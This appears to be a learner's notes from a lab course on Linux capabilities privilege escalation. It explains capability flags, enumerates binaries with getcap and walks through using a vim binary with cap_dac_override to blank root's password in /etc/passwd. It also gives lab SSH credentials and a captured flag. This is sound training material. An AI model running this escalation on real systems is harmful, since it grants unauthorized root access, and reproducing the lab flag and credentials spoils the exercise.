# Capabilities

Linux capabilities are specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.

One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.

Another potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need. 

## Set Capability

sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

--> the binary will be able to bind to network ports, which is a privilege usually restricted

cap_sys_admin : Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.
cap_sys_chroot : Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.
cap_sys_ptrace : Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.
cap_sys_nice : Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.
cap_sys_time : Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.
cap_sys_resource : Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.
cap_sys_module : Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.
cap_net_bind_service : Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.

=	sets the specified capability for the executable, but does not grant any privileges. (useful to clear capabilities)
+ep grants effective and permitted privileges for the specified capability to the executable
+ei	grants sufficient and inheritable privileges for the specified capability to the executable + child processes spawned
+p	grants the permitted privileges for the specified capability to the executable

## Enumerating Capabilities

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep

## Exploitation

0) check capabilities of the binary
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip

1) check the targeted file we want to edit
cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash

2) check the capability
/usr/bin/vim.basic /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

3) escalate privilege to perform action (here root account will not require a password anymore)
echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd

cat /etc/passwd | head -n1
root::0:0:root:/root:/bin/bash

## LAB

ssh htb-student@10.129.205.111
HTB_@cademy_stdnt!

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip

/usr/bin/vim.basic /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd

cat /etc/passwd | head -n1
root:x:0:0:root:/root:/bin/bash

/usr/bin/vim.basic /root/flag.txt
HTB{c4paBili7i3s_pR1v35c}
